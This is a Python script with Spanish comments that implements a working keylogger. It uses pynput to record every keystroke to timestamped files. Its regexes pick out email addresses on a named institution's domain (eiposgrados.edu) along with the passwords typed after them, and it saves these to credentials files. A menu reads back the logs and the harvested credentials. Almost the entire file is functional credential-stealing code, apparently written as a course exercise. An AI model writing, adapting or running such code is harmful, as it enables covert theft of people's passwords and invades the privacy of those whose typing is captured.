#!/usr/bin/python
# -*- coding: utf-8 -*-
# IMPORTACION DE LIBRERIAS
# +-----------------------------------------------+
# Libreria que permite el control y monitorizacion
# de los dispositivos de entrada: pynput
#from pynput import keyboard
from pynput.keyboard import Key, Listener
# Libreria que nos permite extraer informacion del
# sistema:
import platform
# Libreria que nos permite interactuar con el sis_
# tema operativo:
import os
# Libreria para controlar las expresiones regulares
import re
# Libreria para poder trabajar con fechas y horas
from datetime import datetime
# Libreria utilizada para consultar directorios
# del sistema.
import glob

# DECLARACION DE VARIABLES
# *-----------------------------------------------*
# Lista para almacenar las teclas pulsadas
teclas = []
# Fecha y hora actual
fechaHora = datetime.now()
fechaHoraFormat = fechaHora.strftime("%d-%m-%Y-%H-%M-%S")

# FUNCIONES
# *-----------------------------------------------*
# Funcion para imprimir el menu
def menu():
    # Comprobacion del sistema operativo para limpiar el terinal.
    if platform.system() == "Linux":
        os.system("clear")
    elif platform.system() == "Windows":
        os.system("cls")
    elif platform.system() == "Darwin":
        os.system("clear")
    else:
        print("Sistema operativo no detectado. No se pudo limpiar el terminal.")
    # Seccion con la opciones a imprimir por pantalla.
    print("""
    Seleccione una opción:
    1.- Iniciar KeyLogger.
    2.- Leer logs.
    3.- Leer credenciales.
    4.- Salir.
    """)

# Funcion formateo de las teclas.
def formateoTecla(tecla):
    tecla = str(tecla).replace("'", "")
    tecla = str(tecla).replace("Key.space", "[ESPACIO]")
    tecla = str(tecla).replace(" ", "")
    tecla = str(tecla).replace("Key.shift_r", "")
    tecla = str(tecla).replace("Key.esc", "")
    tecla = str(tecla).replace("Key.enter", "\n")
    tecla = str(tecla).replace("Key.backspace", "<[BORRAR]")
    tecla = str(tecla).replace("Key.alt_r", "")
    return tecla

# Funcion para detectar una cadena en especifico.
def detectPassword(check):
    stringTeclas = ' '.join(map(str,check))
    stringFormateado = formateoTecla(stringTeclas)
    # Filtro para extraer los emails
    users = re.findall(r'[\w\.-]+@eiposgrados.edu[\w\.-]+', stringFormateado)
    with open("credentials" + fechaHoraFormat + ".txt", "w") as logfile:
        for user in users:
            logfile.write(":" + str(user) + ":")
    # Filtro para extraer las passwords
    passwords = re.findall(r'\b@eiposgrados.edu.es.*[\r\n\s]+(\w+)\b', stringFormateado)
    with open("credentials" + fechaHoraFormat + ".txt", "a") as logfile:
        for password in passwords:
            logfile.write(str(password) + ":")

# Funcion que imprime por pantalla las teclas pulsadas.
def printDataConsole(teclas):
    for tecla in teclas:
        tecla = formateoTecla(tecla)
        print(tecla)

# Funcion que guarda las teclas en un fichero log.
def saveInFile(teclas):
    with open("keylog" + fechaHoraFormat + ".txt", 'w') as logfile:
        for tecla in teclas:
            tecla = formateoTecla(tecla)
            logfile.write(tecla)

# Funcion intermedia encargada de registrar en el
# log e imprimir por pantalla lo que escribe el usuario.
def on_each_key_press(tecla):
    teclas.append(tecla)
    detectPassword(teclas)
    saveInFile(teclas)
    printDataConsole(teclas)


# Funcion que detecta cuando pulsamos ESC para salir
# del keylogger.
def on_each_key_release(tecla):
    if tecla == Key.esc:
        return False

# Funcion que inicia la monitorizacion del teclado.
def recordKey():
    # Preparamos el listener el cual estara a la escucha
    # de las teclas.
    with Listener(
        # on_press para cuando pulsamos las teclas.
        on_press = on_each_key_press,
        #on_release para salir del keylogger con ESC.
        on_release = on_each_key_release
        ) as listener:
        listener.join()

# Funcion que permite la lectura del log keylog.txt
def readLogs():
    for ficheros in glob.glob("./keylog*.txt"):
        fichero = os.path.basename(ficheros)
        f = open(fichero, "r")
        print("LOG: " + fichero)
        print("++++++++++++++++++++++++++++++++++++++++++++++++++++")
        print(f.read())
    input("Pulsa una tecla para continuar...")

# Funcion que permite la lectura del log credentials.txt
def readCredentials():
    for credentials in glob.glob("./credentials*.txt"):
        credential = os.path.basename(credentials)
        f = open(credential, "r")
        print("LOG: " + credential)
        print("++++++++++++++++++++++++++++++++++++++++++++++++++++")
        print(f.read())
    input("Pulsa una tecla para continuar...")

# Inicio principal del script
if __name__ == '__main__':
    while True:
        # Mostramos el menu.
        menu()
        # Guardamos la opcion que introduce el usuario.
        opcionMenu = input("Opción número: ")
        # Comprobacion del valor introducido por el usuario
        # y ejecución de una acción.
        if opcionMenu == "1" or opcionMenu == "\x1b1":
            recordKey()
        elif opcionMenu == "2" or opcionMenu == "\x1b2":
            readLogs()
        elif opcionMenu == "3" or opcionMenu == "\x1b3":
            readCredentials()
        elif opcionMenu == "4" or opcionMenu == "\x1b4":
            break
        else:
            print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
            print("No has pulsado una opción correcta...")
            print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
            input("Pulsa una tecla para continuar...")
            